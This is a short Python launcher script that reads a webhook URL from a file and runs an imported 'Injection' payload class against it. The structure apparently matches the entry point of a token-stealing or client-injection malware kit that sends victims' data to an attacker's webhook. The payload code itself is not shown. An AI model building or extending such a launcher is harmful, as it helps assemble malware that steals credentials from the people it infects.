from payloads.injection import Injection

webhook = open("webhook", "r").read()


class LuvdU:
    def __init__(self):
        payloads = [Injection]

        for payload in payloads:
            payload(webhook)



if __name__ == "__main__":
    LuvdU()
